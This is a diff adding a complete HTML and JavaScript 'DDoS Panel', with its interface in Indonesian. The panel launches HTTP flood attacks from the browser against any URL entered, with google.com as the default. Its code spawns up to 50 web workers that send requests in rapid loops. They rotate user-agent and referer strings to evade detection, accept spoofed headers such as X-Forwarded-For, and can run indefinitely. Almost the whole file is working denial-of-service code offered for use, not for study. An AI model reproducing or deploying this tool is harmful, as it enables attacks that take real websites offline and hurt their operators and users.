@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ DDoS Panel — Custom Attack</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0b0e14;
+            color: #c0d0e0;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 820px;
+            width: 100%;
+        }
+        .card {
+            background: #151e2a;
+            border-radius: 24px;
+            padding: 32px 40px;
+            border: 1px solid #2a3648;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #e8f0ff;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        h1 small {
+            font-size: 14px;
+            font-weight: 400;
+            color: #5e738a;
+        }
+        .sub {
+            color: #7e8fa0;
+            font-size: 13px;
+            border-bottom: 1px solid #1f2a38;
+            padding-bottom: 16px;
+            margin-bottom: 24px;
+        }
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px 20px;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .form-group.full {
+            grid-column: 1 / -1;
+        }
+        .form-group label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #6e849e;
+            font-weight: 600;
+        }
+        .form-group input, .form-group select {
+            background: #0d141e;
+            border: 1px solid #1f2c3c;
+            border-radius: 12px;
+            padding: 10px 14px;
+            color: #d0e0f0;
+            font-size: 14px;
+            transition: 0.2s;
+            outline: none;
+            font-family: inherit;
+        }
+        .form-group input:focus, .form-group select:focus {
+            border-color: #3a5a7a;
+            box-shadow: 0 0 0 3px rgba(60, 130, 210, 0.15);
+        }
+        .form-group input::placeholder {
+            color: #3d5068;
+        }
+        .form-group .hint {
+            font-size: 11px;
+            color: #4a607a;
+            margin-top: 2px;
+        }
+        .btn-row {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 12px 28px;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn-primary {
+            background: #1f8b4c;
+            color: #d4ffe0;
+            flex: 1;
+            justify-content: center;
+        }
+        .btn-primary:hover {
+            background: #27a05a;
+            transform: scale(1.01);
+        }
+        .btn-danger {
+            background: #a0323a;
+            color: #ffd4d4;
+            flex: 1;
+            justify-content: center;
+        }
+        .btn-danger:hover {
+            background: #c03a44;
+            transform: scale(1.01);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #2a3a50;
+            color: #8aa0b8;
+        }
+        .btn-outline:hover {
+            background: #1a2535;
+        }
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin: 24px 0 16px;
+        }
+        .stat-box {
+            background: #0d141e;
+            border-radius: 14px;
+            padding: 14px 10px;
+            text-align: center;
+            border: 1px solid #1f2c3c;
+        }
+        .stat-box .label {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #5e738a;
+        }
+        .stat-box .value {
+            font-size: 24px;
+            font-weight: 600;
+            color: #b0d0ff;
+            margin-top: 2px;
+            font-variant-numeric: tabular-nums;
+        }
+        .stat-box .value.green { color: #6fcf97; }
+        .stat-box .value.red { color: #e06b6b; }
+        .stat-box .value.orange { color: #e8b86d; }
+
+        .log-area {
+            background: #0a1018;
+            border-radius: 14px;
+            padding: 14px 16px;
+            max-height: 180px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            color: #92a9c2;
+            border: 1px solid #1f2a38;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin-top: 8px;
+        }
+        .log-area::-webkit-scrollbar { width: 4px; }
+        .log-area::-webkit-scrollbar-track { background: #0a1018; }
+        .log-area::-webkit-scrollbar-thumb { background: #2a3a50; border-radius: 8px; }
+
+        .status-badge {
+            display: inline-block;
+            padding: 2px 16px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .status-badge.idle { background: #2a3a50; color: #8aa0b8; }
+        .status-badge.running { background: #1f8b4c; color: #d4ffe0; }
+        .status-badge.stopped { background: #8b3a3a; color: #ffd4d4; }
+
+        @media (max-width: 640px) {
+            .form-grid { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: 1fr 1fr; }
+            .card { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <h1>
+            ⚡ DDoS Panel
+            <small>custom attack</small>
+        </h1>
+        <div class="sub">
+            Target bebas · real-time stats · worker-based
+            <span class="status-badge idle" id="statusBadge" style="margin-left:12px;">● idle</span>
+        </div>
+
+        <!-- FORM -->
+        <div class="form-grid">
+            <div class="form-group full">
+                <label>Target URL / IP <span style="color:#e06b6b;">*</span></label>
+                <input type="text" id="targetInput" placeholder="https://example.com atau http://192.168.1.1:8080" value="https://google.com">
+                <span class="hint">Pakai http:// atau https://, port opsional</span>
+            </div>
+
+            <div class="form-group">
+                <label>Metode HTTP</label>
+                <select id="methodSelect">
+                    <option value="GET">GET</option>
+                    <option value="POST">POST</option>
+                    <option value="HEAD">HEAD</option>
+                    <option value="OPTIONS">OPTIONS</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Thread / Worker</label>
+                <input type="number" id="workerCount" value="12" min="1" max="50">
+                <span class="hint">Semakin banyak semakin ganas (1–50)</span>
+            </div>
+
+            <div class="form-group">
+                <label>Req per worker per tick</label>
+                <input type="number" id="reqPerTick" value="4" min="1" max="20">
+                <span class="hint">Request per siklus per worker</span>
+            </div>
+
+            <div class="form-group">
+                <label>Interval (ms)</label>
+                <input type="number" id="tickInterval" value="40" min="10" max="500">
+                <span class="hint">Semakin kecil semakin cepat</span>
+            </div>
+
+            <div class="form-group">
+                <label>Durasi (detik) — 0 = infinite</label>
+                <input type="number" id="durationSec" value="0" min="0">
+                <span class="hint">0 = jalan terus sampai di-stop manual</span>
+            </div>
+
+            <div class="form-group">
+                <label>Payload (opsional, untuk POST)</label>
+                <input type="text" id="payloadInput" placeholder='{"key":"value"}' value="">
+                <span class="hint">Isi body request (JSON / string)</span>
+            </div>
+
+            <div class="form-group">
+                <label>Custom Header (opsional)</label>
+                <input type="text" id="customHeader" placeholder="X-Custom: value">
+                <span class="hint">Contoh: X-Forwarded-For: 1.2.3.4</span>
+            </div>
+        </div>
+
+        <!-- BUTTONS -->
+        <div class="btn-row">
+            <button class="btn btn-primary" id="startBtn">▶ START ATTACK</button>
+            <button class="btn btn-danger" id="stopBtn" disabled>■ STOP</button>
+            <button class="btn btn-outline" id="resetStatsBtn">↺ reset stats</button>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats-grid">
+            <div class="stat-box"><div class="label">Total Requests</div><div class="value" id="totalReq">0</div></div>
+            <div class="stat-box"><div class="label">Req / sec</div><div class="value green" id="rps">0</div></div>
+            <div class="stat-box"><div class="label">Workers</div><div class="value" id="activeWorkers">0</div></div>
+            <div class="stat-box"><div class="label">Elapsed</div><div class="value orange" id="elapsedTime">00:00</div></div>
+        </div>
+
+        <!-- LOG -->
+        <div class="log-area" id="logContainer">[ system ] panel siap. Masukkan target dan mulai.</div>
+    </div>
+</div>
+
+<script>
+(function() {
+    // ------------------------------------------------
+    // ELEMEN
+    // ------------------------------------------------
+    const $ = id => document.getElementById(id);
+    const targetInput = $('targetInput');
+    const methodSelect = $('methodSelect');
+    const workerCountInput = $('workerCount');
+    const reqPerTickInput = $('reqPerTick');
+    const tickIntervalInput = $('tickInterval');
+    const durationSecInput = $('durationSec');
+    const payloadInput = $('payloadInput');
+    const customHeaderInput = $('customHeader');
+
+    const startBtn = $('startBtn');
+    const stopBtn = $('stopBtn');
+    const resetStatsBtn = $('resetStatsBtn');
+    const statusBadge = $('statusBadge');
+
+    const totalReqEl = $('totalReq');
+    const rpsEl = $('rps');
+    const activeWorkersEl = $('activeWorkers');
+    const elapsedTimeEl = $('elapsedTime');
+    const logEl = $('logContainer');
+
+    // ------------------------------------------------
+    // STATE
+    // ------------------------------------------------
+    let isRunning = false;
+    let totalRequests = 0;
+    let startTime = null;
+    let rpsInterval = null;
+    let rpsCounter = 0;
+    let currentRps = 0;
+    let elapsedInterval = null;
+    let workers = [];
+    let stopRequested = false;
+    let attackTimer = null;
+
+    // ------------------------------------------------
+    // LOGGING
+    // ------------------------------------------------
+    function log(msg) {
+        const ts = new Date().toLocaleTimeString();
+        const line = `[${ts}] ${msg}`;
+        console.log(line);
+        logEl.textContent += line + '\n';
+        logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function updateUI() {
+        totalReqEl.textContent = totalRequests.toLocaleString();
+        activeWorkersEl.textContent = workers.length;
+    }
+
+    function setStatus(state) {
+        statusBadge.className = 'status-badge ' + state;
+        statusBadge.textContent = state === 'idle' ? '● idle' :
+                                  state === 'running' ? '● running' : '● stopped';
+    }
+
+    // ------------------------------------------------
+    // WORKER SCRIPT (dinamis)
+    // ------------------------------------------------
+    function buildWorkerScript(target, method, reqPerTick, interval, payload, customHeader) {
+        const payloadStr = payload ? JSON.stringify(payload) : 'null';
+        const headerStr = customHeader ? customHeader : '';
+
+        return `
+            const TARGET = '${target}';
+            const METHOD = '${method}';
+            const REQ_PER_TICK = ${reqPerTick};
+            const TICK_INTERVAL = ${interval};
+            const PAYLOAD = ${payloadStr};
+            const CUSTOM_HEADER = '${headerStr}';
+
+            const UA_POOL = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/126.0',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
+            ];
+
+            const REF_POOL = [
+                'https://www.google.com/','https://www.bing.com/','https://duckduckgo.com/',
+                'https://yahoo.com/','https://www.reddit.com/','https://github.com/',
+                'https://stackoverflow.com/','https://news.ycombinator.com/','https://medium.com/',
+                'https://twitter.com/','https://www.facebook.com/','https://www.youtube.com/'
+            ];
+
+            function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+            function buildHeaders() {
+                const h = new Headers({
+                    'User-Agent': rand(UA_POOL),
+                    'Referer': rand(REF_POOL),
+                    'Accept': rand(['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','application/json,text/plain,*/*;q=0.9','*/*']),
+                    'Accept-Encoding': rand(['gzip, deflate, br', 'gzip, deflate']),
+                    'Accept-Language': rand(['en-US,en;q=0.9','id-ID,id;q=0.9,en;q=0.8','en-GB,en;q=0.8']),
+                    'Cache-Control': rand(['no-cache','max-age=0']),
+                    'Connection': 'keep-alive'
+                });
+                if (Math.random() > 0.6) h.set('DNT', '1');
+                if (CUSTOM_HEADER) {
+                    const parts = CUSTOM_HEADER.split(':');
+                    if (parts.length >= 2) h.set(parts[0].trim(), parts.slice(1).join(':').trim());
+                }
+                return h;
+            }
+
+            function fire() {
+                const headers = buildHeaders();
+                const opts = {
+                    method: METHOD,
+                    headers: headers,
+                    mode: 'no-cors',
+                    keepalive: true,
+                    cache: 'no-store',
+                    redirect: 'follow'
+                };
+                if (METHOD === 'POST' && PAYLOAD) {
+                    opts.body = typeof PAYLOAD === 'string' ? PAYLOAD : JSON.stringify(PAYLOAD);
+                    headers.set('Content-Type', 'application/json');
+                }
+                fetch(TARGET, opts).catch(() => {});
+            }
+
+            function tick() {
+                for (let i = 0; i < REQ_PER_TICK; i++) fire();
+                self.postMessage({ type: 'count', delta: REQ_PER_TICK });
+            }
+
+            let timer = setInterval(tick, TICK_INTERVAL);
+            self.postMessage({ type: 'started' });
+
+            // Listen for stop signal
+            self.onmessage = function(e) {
+                if (e.data === 'stop') {
+                    clearInterval(timer);
+                    self.postMessage({ type: 'stopped' });
+                    self.close();
+                }
+            };
+        `;
+    }
+
+    // ------------------------------------------------
+    // SPAWN / STOP WORKERS
+    // ------------------------------------------------
+    function spawnWorkers(count, target, method, reqPerTick, interval, payload, customHeader) {
+        const newWorkers = [];
+        for (let i = 0; i < count; i++) {
+            try {
+                const script = buildWorkerScript(target, method, reqPerTick, interval, payload, customHeader);
+                const blob = new Blob([script], { type: 'application/javascript' });
+                const url = URL.createObjectURL(blob);
+                const w = new Worker(url);
+                URL.revokeObjectURL(url);
+
+                w.onmessage = function(e) {
+                    const data = e.data;
+                    if (data.type === 'count' && data.delta) {
+                        totalRequests += data.delta;
+                        rpsCounter += data.delta;
+                        updateUI();
+                    } else if (data.type === 'started') {
+                        log(`worker #${i+1} started`);
+                    } else if (data.type === 'stopped') {
+                        log(`worker #${i+1} stopped`);
+                    }
+                };
+                w.onerror = (err) => log(`worker #${i+1} error: ${err.message}`);
+                newWorkers.push(w);
+            } catch (e) {
+                log(`failed spawn worker #${i+1}: ${e.message}`);
+            }
+        }
+        return newWorkers;
+    }
+
+    function stopAllWorkers() {
+        for (const w of workers) {
+            try { w.postMessage('stop'); } catch (_) {}
+        }
+        workers = [];
+        updateUI();
+        log('semua worker dihentikan');
+    }
+
+    // ------------------------------------------------
+    // RPS & ELAPSED TIMER
+    // ------------------------------------------------
+    function startRpsCounter() {
+        rpsCounter = 0;
+        if (rpsInterval) clearInterval(rpsInterval);
+        rpsInterval = setInterval(() => {
+            currentRps = rpsCounter;
+            rpsCounter = 0;
+            rpsEl.textContent = currentRps.toLocaleString();
+        }, 1000);
+    }
+
+    function startElapsedTimer() {
+        startTime = Date.now();
+        if (elapsedInterval) clearInterval(elapsedInterval);
+        elapsedInterval = setInterval(() => {
+            const diff = Math.floor((Date.now() - startTime) / 1000);
+            const m = String(Math.floor(diff / 60)).padStart(2, '0');
+            const s = String(diff % 60).padStart(2, '0');
+            elapsedTimeEl.textContent = `${m}:${s}`;
+        }, 1000);
+    }
+
+    function stopTimers() {
+        if (rpsInterval) clearInterval(rpsInterval);
+        if (elapsedInterval) clearInterval(elapsedInterval);
+        rpsEl.textContent = '0';
+        currentRps = 0;
+    }
+
+    // ------------------------------------------------
+    // MAIN START / STOP
+    // ------------------------------------------------
+    function startAttack() {
+        if (isRunning) return;
+
+        const target = targetInput.value.trim();
+        if (!target) {
+            log('❌ target kosong!');
+            return;
+        }
+        // validasi sederhana
+        if (!target.startsWith('http://') && !target.startsWith('https://')) {
+            log('⚠️ target harus pakai http:// atau https:// — otomatis ditambahkan');
+            targetInput.value = 'https://' + target;
+        }
+
+        const workerCount = Math.min(50, Math.max(1, parseInt(workerCountInput.value) || 12));
+        const reqPerTick = Math.min(20, Math.max(1, parseInt(reqPerTickInput.value) || 4));
+        const interval = Math.min(500, Math.max(10, parseInt(tickIntervalInput.value) || 40));
+        const duration = parseInt(durationSecInput.value) || 0;
+        const method = methodSelect.value;
+        const payload = payloadInput.value.trim() || null;
+        const customHeader = customHeaderInput.value.trim() || '';
+
+        const finalTarget = targetInput.value;
+
+        log(`🚀 memulai serangan ke ${finalTarget}`);
+        log(`   workers: ${workerCount}, req/tick: ${reqPerTick}, interval: ${interval}ms, method: ${method}`);
+
+        // Reset state
+        totalRequests = 0;
+        rpsCounter = 0;
+        currentRps = 0;
+        updateUI();
+        setStatus('running');
+        isRunning = true;
+        stopRequested = false;
+
+        // UI
+        startBtn.disabled = true;
+        stopBtn.disabled = false;
+
+        // Spawn workers
+        workers = spawnWorkers(workerCount, finalTarget, method, reqPerTick, interval, payload, customHeader);
+        updateUI();
+        log(`${workers.length} worker aktif`);
+
+        // Timer
+        startRpsCounter();
+        startElapsedTimer();
+
+        // Durasi (jika > 0)
+        if (duration > 0) {
+            log(`⏱️ attack akan berhenti otomatis dalam ${duration} detik`);
+            if (attackTimer) clearTimeout(attackTimer);
+            attackTimer = setTimeout(() => {
+                if (isRunning) stopAttack('⏹️ durasi habis');
+            }, duration * 1000);
+        }
+    }
+
+    function stopAttack(reason) {
+        if (!isRunning) return;
+        isRunning = false;
+        stopRequested = true;
+        if (attackTimer) { clearTimeout(attackTimer); attackTimer = null; }
+
+        log(`⏹️ menghentikan serangan${reason ? ' — ' + reason : ''}`);
+        stopAllWorkers();
+        stopTimers();
+        setStatus('stopped');
+        startBtn.disabled = false;
+        stopBtn.disabled = true;
+        log('✔️ serangan dihentikan');
+    }
+
+    // ------------------------------------------------
+    // RESET STATS (tanpa hentikan attack)
+    // ------------------------------------------------
+    function resetStats() {
+        totalRequests = 0;
+        rpsCounter = 0;
+        currentRps = 0;
+        updateUI();
+        rpsEl.textContent = '0';
+        elapsedTimeEl.textContent = '00:00';
+        log('↺ stats di-reset');
+    }
+
+    // ------------------------------------------------
+    // EVENT BINDING
+    // ------------------------------------------------
+    startBtn.addEventListener('click', startAttack);
+    stopBtn.addEventListener('click', () => stopAttack('manual stop'));
+    resetStatsBtn.addEventListener('click', resetStats);
+
+    window.addEventListener('beforeunload', function() {
+        if (isRunning) stopAttack('page unload');
+        for (const w of workers) {
+            try { w.terminate(); } catch (_) {}
+        }
+    });
+
+    // ------------------------------------------------
+    // INISIALISASI
+    // ------------------------------------------------
+    setStatus('idle');
+    stopBtn.disabled = true;
+    log('✅ panel siap. Masukkan target dan mulai.');
+    updateUI();
+
+})();
+</script>
+</body>
+</html>
